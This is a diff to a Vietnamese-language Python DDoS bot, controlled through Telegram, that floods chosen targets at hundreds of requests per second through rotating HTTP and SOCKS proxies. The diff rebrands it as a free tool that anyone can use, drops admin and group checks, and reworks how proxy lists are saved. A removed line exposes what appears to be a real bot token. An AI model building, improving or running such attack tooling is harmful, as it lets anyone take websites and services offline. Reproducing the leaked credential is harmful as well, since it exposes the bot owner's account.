@@ -1,6 +1,6 @@
 # =====================================================
-# DDOS BOT 5.0 - TỰ ĐỘNG LƯU PROXY
-# TỰ ĐỘNG TẢI, LƯU, RELOAD PROXY TỪ TELEGRAM
+# DDOS BOT 5.0 - FREE UNLIMITED - KHÔNG GIỚI HẠN
+# BỎ ADMIN, BỎ GROUP, BỎ USER, AI CŨNG DÙNG ĐƯỢC
 # =====================================================
 
 import requests
@@ -18,21 +18,22 @@ import hashlib
 import base64
 import shutil
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from datetime import datetime
+from datetime import datetime, timedelta
 from urllib.parse import urlparse, quote
 import socks
 from flask import Flask, jsonify, render_template_string
 
 # -------------------- CẤU HÌNH --------------------
-TELEGRAM_BOT_TOKEN = "6320148381:AAGj1RnEXBmNuWBhJF8l7OvcQTwhh6VTa-s"  # THAY TOKEN THẬT
+TELEGRAM_BOT_TOKEN = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"  # THAY TOKEN THẬT
+
 THREAD_COUNT = 800
 REQUESTS_PER_SECOND = 500
 MAX_RUN_TIME = 120
 CONNECTION_POOL = 150
 TIMEOUT = 1.5
 COOLDOWN_TIME = 1800  # 30 phút
-AUTO_SAVE_PROXY = True  # Tự động lưu proxy
-PROXY_BACKUP_FILE = "proxy_backup.json"  # File backup proxy
+AUTO_SAVE_PROXY = True
+PROXY_BACKUP_FILE = "proxy_backup.json"
 
 # -------------------- BIẾN TOÀN CỤC --------------------
 stop_event = threading.Event()
@@ -213,22 +214,16 @@ def load_proxies(filepath):
     
     return http_proxies, socks5_proxies, socks4_proxies
 
-# =====================================================
-# TỰ ĐỘNG LƯU PROXY VÀO FILE JSON
-# =====================================================
 def save_proxy_to_backup(proxy_dict):
-    """Lưu proxy vào file backup JSON"""
     if not AUTO_SAVE_PROXY:
         return
     
     try:
-        # Đọc backup hiện có
         backup_data = []
         if os.path.exists(PROXY_BACKUP_FILE):
             with open(PROXY_BACKUP_FILE, 'r', encoding='utf-8') as f:
                 backup_data = json.load(f)
         
-        # Thêm proxy mới
         proxy_entry = {
             'raw': proxy_dict.get('raw', ''),
             'ip': proxy_dict.get('ip', ''),
@@ -240,7 +235,6 @@ def save_proxy_to_backup(proxy_dict):
             'added_time': time.time()
         }
         
-        # Kiểm tra trùng lặp
         exists = False
         for p in backup_data:
             if p.get('raw') == proxy_entry['raw']:
@@ -251,11 +245,9 @@ def save_proxy_to_backup(proxy_dict):
         if not exists:
             backup_data.append(proxy_entry)
         
-        # Giới hạn số lượng proxy lưu (tối đa 10000)
         if len(backup_data) > 10000:
             backup_data = backup_data[-10000:]
         
-        # Lưu lại
         with open(PROXY_BACKUP_FILE, 'w', encoding='utf-8') as f:
             json.dump(backup_data, f, indent=2, ensure_ascii=False)
         
@@ -264,7 +256,6 @@ def save_proxy_to_backup(proxy_dict):
         return False
 
 def load_proxy_from_backup():
-    """Tải proxy từ file backup"""
     if not os.path.exists(PROXY_BACKUP_FILE):
         return [], [], []
     
@@ -299,67 +290,7 @@ def load_proxy_from_backup():
     except Exception:
         return [], [], []
 
-def merge_proxies_from_file(file_path, chat_id):
-    """Hợp nhất proxy từ file vào backup"""
-    global proxy_list, proxy_http, proxy_socks5, proxy_socks4, proxy_update_time
-    
-    http, socks5, socks4 = load_proxies(file_path)
-    total = len(http) + len(socks5) + len(socks4)
-    
-    if total == 0:
-        send_telegram(f"❌ Không có proxy hợp lệ trong file.", chat_id)
-        return False
-    
-    # Lưu từng proxy vào backup
-    for proxy in http + socks5 + socks4:
-        save_proxy_to_backup(proxy)
-    
-    # Load lại từ backup
-    proxy_http, proxy_socks5, proxy_socks4 = load_proxy_from_backup()
-    proxy_list = proxy_http + proxy_socks5 + proxy_socks4
-    proxy_update_time = time.time()
-    
-    # Ghi vào file proxies.txt
-    save_proxy_to_text_file()
-    
-    send_telegram(f"""
-🔄 Đã hợp nhất proxy:
-📊 HTTP: {len(proxy_http)}
-📊 SOCKS5: {len(proxy_socks5)}
-📊 SOCKS4: {len(proxy_socks4)}
-📊 Tổng: {len(proxy_list)}
-💾 Đã lưu backup: {PROXY_BACKUP_FILE}
-    """, chat_id)
-    return True
-
-def save_proxy_to_text_file():
-    """Lưu proxy vào file proxies.txt từ backup"""
-    try:
-        # Load từ backup
-        http, socks5, socks4 = load_proxy_from_backup()
-        all_proxies = http + socks5 + socks4
-        
-        if not all_proxies:
-            return
-        
-        # Ghi vào file
-        with open('proxies.txt', 'w', encoding='utf-8') as f:
-            f.write("# Proxy list - Tự động lưu\n")
-            f.write(f"# Số lượng: {len(all_proxies)}\n")
-            f.write(f"# Cập nhật: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-            f.write("# ====================================\n\n")
-            
-            for proxy in all_proxies:
-                raw = proxy.get('raw', '')
-                if raw:
-                    f.write(raw + '\n')
-        
-        return True
-    except Exception:
-        return False
-
 def reload_proxy_from_backup():
-    """Tải lại proxy từ backup"""
     global proxy_http, proxy_socks5, proxy_socks4, proxy_list, proxy_update_time
     
     http, socks5, socks4 = load_proxy_from_backup()
@@ -371,127 +302,11 @@ def reload_proxy_from_backup():
         proxy_socks4 = socks4
         proxy_list = http + socks5 + socks4
         proxy_update_time = time.time()
-        send_telegram(f"🔄 Đã tải lại proxy từ backup: {total} proxy")
         return True
     return False
 
 # =====================================================
-# CẬP NHẬT PROXY - TỰ ĐỘNG LƯU
-# =====================================================
-def update_proxies_from_file(file_path, chat_id):
-    global proxy_list, proxy_http, proxy_socks5, proxy_socks4, proxy_update_time
-    
-    http, socks5, socks4 = load_proxies(file_path)
-    total = len(http) + len(socks5) + len(socks4)
-    
-    if total == 0:
-        send_telegram(f"❌ Không có proxy hợp lệ trong file.", chat_id)
-        return False
-    
-    # Lưu vào backup
-    for proxy in http + socks5 + socks4:
-        save_proxy_to_backup(proxy)
-    
-    # Load từ backup
-    proxy_http, proxy_socks5, proxy_socks4 = load_proxy_from_backup()
-    proxy_list = proxy_http + proxy_socks5 + proxy_socks4
-    proxy_update_time = time.time()
-    
-    # Ghi vào file txt
-    save_proxy_to_text_file()
-    
-    send_telegram(f"""
-🔄 Đã cập nhật proxy:
-📊 HTTP: {len(proxy_http)}
-📊 SOCKS5: {len(proxy_socks5)}
-📊 SOCKS4: {len(proxy_socks4)}
-📊 Tổng: {len(proxy_list)}
-💾 Đã lưu backup: {PROXY_BACKUP_FILE}
-    """, chat_id)
-    return True
-
-# =====================================================
-# TỰ ĐỘNG LƯU PROXY KHI NHẬN FILE TỪ TELEGRAM
-# =====================================================
-def download_telegram_file(file_id, save_path):
-    try:
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile"
-        params = {'file_id': file_id}
-        r = requests.get(url, params=params, timeout=10)
-        if r.status_code != 200:
-            return False
-        
-        data = r.json()
-        if not data.get('ok'):
-            return False
-        
-        file_path = data['result']['file_path']
-        download_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"
-        
-        r = requests.get(download_url, timeout=30)
-        if r.status_code != 200:
-            return False
-        
-        with open(save_path, 'wb') as f:
-            f.write(r.content)
-        return True
-    except:
-        return False
-
-def handle_proxy_file(file_id, file_name, chat_id):
-    """Xử lý file proxy nhận từ Telegram"""
-    save_path = f"proxy_{int(time.time())}.txt"
-    
-    send_telegram(f"📥 Đang tải file proxy: {file_name}", chat_id)
-    
-    if download_telegram_file(file_id, save_path):
-        # Hợp nhất proxy
-        if merge_proxies_from_file(save_path, chat_id):
-            # Lưu file vào thư mục proxy_history
-            os.makedirs('proxy_history', exist_ok=True)
-            history_path = f"proxy_history/{datetime.now().strftime('%Y%m%d_%H%M%S')}_{file_name}"
-            shutil.copy(save_path, history_path)
-            
-            send_telegram(f"""
-✅ Đã lưu proxy thành công!
-📁 File gốc: {file_name}
-📁 Backup: {PROXY_BACKUP_FILE}
-📁 Lịch sử: {history_path}
-📊 Tổng proxy: {len(proxy_list)}
-            """, chat_id)
-        
-        # Xóa file tạm
-        threading.Timer(5, lambda: os.remove(save_path) if os.path.exists(save_path) else None).start()
-    else:
-        send_telegram("❌ Không thể tải file proxy.", chat_id)
-
-# =====================================================
-# TỰ ĐỘNG RELOAD PROXY MỖI 10 PHÚT
-# =====================================================
-def auto_reload_proxy():
-    global proxy_http, proxy_socks5, proxy_socks4, proxy_list, proxy_update_time
-    
-    while True:
-        time.sleep(600)  # 10 phút
-        
-        # Tải lại từ backup
-        http, socks5, socks4 = load_proxy_from_backup()
-        total = len(http) + len(socks5) + len(socks4)
-        
-        if total > 0:
-            # Kiểm tra xem có thay đổi không
-            current_total = len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)
-            if total != current_total:
-                proxy_http = http
-                proxy_socks5 = socks5
-                proxy_socks4 = socks4
-                proxy_list = http + socks5 + socks4
-                proxy_update_time = time.time()
-                save_proxy_to_text_file()
-                print(f"[+] Auto reload proxy: {total} proxy")
-
-# =====================================================
-# GỬI TELEGRAM
+# GỬI TELEGRAM - KHÔNG GIỚI HẠN
 # =====================================================
 def send_telegram(message, chat_id=None, retry=2):
     global last_activity, chat_id_saved
@@ -534,6 +349,82 @@ def send_telegram(message, chat_id=None, retry=2):
             time.sleep(0.5)
     
     return False
+
+# =====================================================
+# DOWNLOAD FILE TELEGRAM
+# =====================================================
+def download_telegram_file(file_id, save_path):
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile"
+        params = {'file_id': file_id}
+        r = requests.get(url, params=params, timeout=10)
+        if r.status_code != 200:
+            return False
+        
+        data = r.json()
+        if not data.get('ok'):
+            return False
+        
+        file_path = data['result']['file_path']
+        download_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"
+        
+        r = requests.get(download_url, timeout=30)
+        if r.status_code != 200:
+            return False
+        
+        with open(save_path, 'wb') as f:
+            f.write(r.content)
+        return True
+    except:
+        return False
+
+# =====================================================
+# XỬ LÝ FILE PROXY - TỰ ĐỘNG LƯU
+# =====================================================
+def handle_proxy_file(file_id, file_name, chat_id):
+    save_path = f"proxy_{int(time.time())}.txt"
+    
+    send_telegram(f"📥 Đang tải file proxy: {file_name}", chat_id)
+    
+    if download_telegram_file(file_id, save_path):
+        http, socks5, socks4 = load_proxies(save_path)
+        total = len(http) + len(socks5) + len(socks4)
+        
+        if total > 0:
+            for proxy in http + socks5 + socks4:
+                save_proxy_to_backup(proxy)
+            
+            global proxy_http, proxy_socks5, proxy_socks4, proxy_list, proxy_update_time
+            proxy_http, proxy_socks5, proxy_socks4 = load_proxy_from_backup()
+            proxy_list = proxy_http + proxy_socks5 + proxy_socks4
+            proxy_update_time = time.time()
+            
+            # Ghi vào file txt
+            with open('proxies.txt', 'w', encoding='utf-8') as f:
+                f.write("# Proxy list - Tự động lưu\n")
+                f.write(f"# Số lượng: {len(proxy_list)}\n")
+                f.write(f"# Cập nhật: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
+                for proxy in proxy_list:
+                    if proxy.get('raw'):
+                        f.write(proxy['raw'] + '\n')
+            
+            # Lưu lịch sử
+            os.makedirs('proxy_history', exist_ok=True)
+            history_path = f"proxy_history/{datetime.now().strftime('%Y%m%d_%H%M%S')}_{file_name}"
+            shutil.copy(save_path, history_path)
+            
+            send_telegram(f"""
+✅ Đã lưu proxy thành công!
+📁 File gốc: {file_name}
+📊 HTTP: {len(proxy_http)} | SOCKS5: {len(proxy_socks5)} | SOCKS4: {len(proxy_socks4)}
+📊 Tổng: {len(proxy_list)}
+💾 Backup: {PROXY_BACKUP_FILE}
+📁 Lịch sử: {history_path}
+            """, chat_id)
+        
+        threading.Timer(5, lambda: os.remove(save_path) if os.path.exists(save_path) else None).start()
+    else:
+        send_telegram("❌ Không thể tải file proxy.", chat_id)
 
 # =====================================================
 # RESOLVE DNS
@@ -889,7 +780,7 @@ def get_stats_text():
         proxy_stats = attack_stats.get('proxy_stats', {})
         
         return f"""
-<b>🔥 NEXUS STRESS PANEL v6 - DDOS BOT 5.0</b>
+<b>🔥 DDOS BOT 5.0 - FREE UNLIMITED</b>
 📌 Trạng thái: {status}
 ⏳ Cooldown: {cooldown_status}
 ⏱ Uptime: {uptime_str}
@@ -1023,7 +914,7 @@ def run_attack(target, chat_id):
     """, chat_id)
 
 # =====================================================
-# TELEGRAM LISTENER
+# TELEGRAM LISTENER - KHÔNG GIỚI HẠN
 # =====================================================
 def telegram_listener():
     global is_running, attack_thread, chat_id_saved
@@ -1033,7 +924,7 @@ def telegram_listener():
     last_update_id = 0
     
     send_telegram("""
-🚀 <b>DDOS BOT 5.0 - TỰ ĐỘNG LƯU PROXY</b>
+🚀 <b>DDOS BOT 5.0 - FREE UNLIMITED</b>
 ✅ Đã khởi động thành công!
 ⚡ Tốc độ tối đa: 500+ req/s
 📌 Hỗ trợ HTTP, SOCKS4, SOCKS5
@@ -1088,7 +979,7 @@ Gửi file .txt chứa proxy - Bot tự động lưu!
                                 file_id = document['file_id']
                                 handle_proxy_file(file_id, file_name, chat_id)
                         
-                        # Xử lý lệnh
+                        # Xử lý lệnh - KHÔNG GIỚI HẠN
                         text = msg.get('text', '').strip()
                         if not text:
                             continue
@@ -1162,7 +1053,6 @@ Tổng: {len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)}
                         
                         elif cmd == '/reloadproxy':
                             if reload_proxy_from_backup():
-                                save_proxy_to_text_file()
                                 send_telegram(f"✅ Đã tải lại proxy từ backup: {len(proxy_list)} proxy", chat_id)
                             else:
                                 send_telegram("❌ Không có backup proxy.", chat_id)
@@ -1191,9 +1081,9 @@ Tổng: {len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)}
                         
                         elif cmd == '/help':
                             help_text = """
-<b>🤖 DDOS BOT 5.0 - TỰ ĐỘNG LƯU PROXY</b>
+<b>🤖 DDOS BOT 5.0 - FREE UNLIMITED</b>
 
-📌 <b>CHẠY 24/7 - TỐC ĐỘ CAO</b>
+📌 <b>CHẠY 24/7 - TỐC ĐỘ CAO - MIỄN PHÍ</b>
 
 📤 <b>GỬI FILE PROXY:</b>
 Gửi file .txt chứa danh sách proxy
@@ -1227,12 +1117,48 @@ Hỗ trợ: HTTP, SOCKS4, SOCKS5
 
 💾 <b>FILE BACKUP:</b>
 {PROXY_BACKUP_FILE}
+
+🎯 <b>KHÔNG GIỚI HẠN:</b>
+- Không cần admin
+- Không cần group
+- Không cần user
+- Ai cũng dùng được
+- Hoàn toàn miễn phí
                             """
                             send_telegram(help_text, chat_id)
             
             time.sleep(2)
         except Exception:
             time.sleep(5)
+
+# =====================================================
+# AUTO RELOAD PROXY
+# =====================================================
+def auto_reload_proxy():
+    global proxy_http, proxy_socks5, proxy_socks4, proxy_list, proxy_update_time
+    
+    while True:
+        time.sleep(600)
+        
+        http, socks5, socks4 = load_proxy_from_backup()
+        total = len(http) + len(socks5) + len(socks4)
+        
+        if total > 0:
+            current_total = len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)
+            if total != current_total:
+                proxy_http = http
+                proxy_socks5 = socks5
+                proxy_socks4 = socks4
+                proxy_list = http + socks5 + socks4
+                proxy_update_time = time.time()
+                with open('proxies.txt', 'w', encoding='utf-8') as f:
+                    f.write("# Proxy list - Auto reload\n")
+                    f.write(f"# Số lượng: {len(proxy_list)}\n")
+                    f.write(f"# Cập nhật: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
+                    for proxy in proxy_list:
+                        if proxy.get('raw'):
+                            f.write(proxy['raw'] + '\n')
+                print(f"[+] Auto reload proxy: {total} proxy")
 
 # =====================================================
 # HEARTBEAT
@@ -1284,7 +1210,7 @@ web_app = Flask(__name__)
 @web_app.route('/')
 def home():
     return jsonify({
-        'status': 'DDOS Bot 5.0 - Auto Save Proxy',
+        'status': 'DDOS Bot 5.0 - FREE UNLIMITED',
         'uptime': int(time.time() - bot_start_time),
         'proxy_count': len(proxy_list),
         'http_proxies': len(proxy_http),
@@ -1352,7 +1278,13 @@ if __name__ == "__main__":
         proxy_update_time = time.time()
         print(f"[+] Đã tải proxy từ backup: HTTP={len(proxy_http)} SOCKS5={len(proxy_socks5)} SOCKS4={len(proxy_socks4)}")
         # Ghi vào file txt
-        save_proxy_to_text_file()
+        with open('proxies.txt', 'w', encoding='utf-8') as f:
+            f.write("# Proxy list - Backup\n")
+            f.write(f"# Số lượng: {len(proxy_list)}\n")
+            f.write(f"# Cập nhật: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
+            for proxy in proxy_list:
+                if proxy.get('raw'):
+                    f.write(proxy['raw'] + '\n')
     else:
         # Thử tải từ file proxies.txt
         if os.path.exists("proxies.txt"):
@@ -1377,7 +1309,7 @@ if __name__ == "__main__":
                 f.write("# Gửi file .txt qua Telegram để cập nhật proxy\n")
     
     print("="*60)
-    print("🔥 DDOS BOT 5.0 - TỰ ĐỘNG LƯU PROXY")
+    print("🔥 DDOS BOT 5.0 - FREE UNLIMITED")
     print("="*60)
     print(f"[+] Token: {TELEGRAM_BOT_TOKEN[:15]}...")
     print(f"[+] HTTP: {len(proxy_http)} | SOCKS5: {len(proxy_socks5)} | SOCKS4: {len(proxy_socks4)}")
@@ -1387,6 +1319,7 @@ if __name__ == "__main__":
     print(f"[+] Tốc độ: {REQUESTS_PER_SECOND} req/s")
     print("="*60)
     print("[+] BOT ĐÃ SẴN SÀNG - CHẠY 24/7")
+    print("[+] KHÔNG GIỚI HẠN - MIỄN PHÍ - AI CŨNG DÙNG ĐƯỢC")
     print("[+] TỰ ĐỘNG LƯU PROXY KHI NHẬN FILE")
     print("[+] GỬI FILE .txt QUA TELEGRAM ĐỂ CẬP NHẬT")
     print("="*60)
